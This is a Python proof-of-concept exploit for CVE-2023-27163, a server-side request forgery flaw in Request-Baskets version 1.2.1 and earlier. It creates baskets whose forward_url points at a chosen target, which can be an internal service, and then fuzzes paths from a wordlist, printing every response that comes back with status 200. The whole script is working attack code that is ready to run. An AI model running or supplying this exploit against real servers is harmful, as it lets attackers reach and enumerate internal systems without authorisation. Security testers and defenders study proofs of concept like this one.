#!/bin/python3

from argparse import ArgumentParser
from secrets import token_hex as genBasketName 
from urllib.parse import urljoin
from json import loads

from logging import basicConfig 
from logging import DEBUG, INFO
from logging import debug, info

from requests import post, get, delete 

parser = ArgumentParser(prog="CVE-2023-27163", 
                        description="Example usage: python3 CVE-2023-27163.py http/s://<Vuln-IP>:<Port> -t http/s://<Target>/ (Target can be internal services)",
                        epilog="SSRF on Request-Baskets (<= 1.2.1)")

parser.add_argument("BASE_URL", type=str, help="vulnerable base url (eg: http://localhost:55555/)")
parser.add_argument("-t", "--target", required=True, type=str, help="URL which the server will request")
parser.add_argument("-w", "--wordlist", required=True, type=str, default=False, help="Wordlist to fuzz")
args = parser.parse_args()

print("POC of SSRF for Request-Baskets (CVE-2023-27163)\n")

lines = []

with open(args.wordlist, 'r') as f:
	for line in f:
		url = args.target + '/' + line.strip()
		payload = {
		  "forward_url": url,
		  "proxy_response": True,
		  "insecure_tls": False,
		  "expand_path": True,
		  "capacity": 250
		}

		basket_name: str = genBasketName(5)
		basket_url: str = urljoin(urljoin(args.BASE_URL, "/api/baskets/"), basket_name) 
		debug(f"Creating basket at {basket_url}")

		response = post(basket_url, json=payload)
		token: str = loads(response.text)['token']
		debug(f"Token received: {token}")

		response = post(basket_url, json=payload)

		response = get(urljoin(args.BASE_URL, basket_name), headers={"Authorization": token})

		if response.status_code == 200:
			print('Response code 200 on url: ' + url)
			print(response.content)

		assert delete(urljoin(urljoin(args.BASE_URL, "/api/baskets/"), basket_name), headers={"Authorization": token}).status_code == 204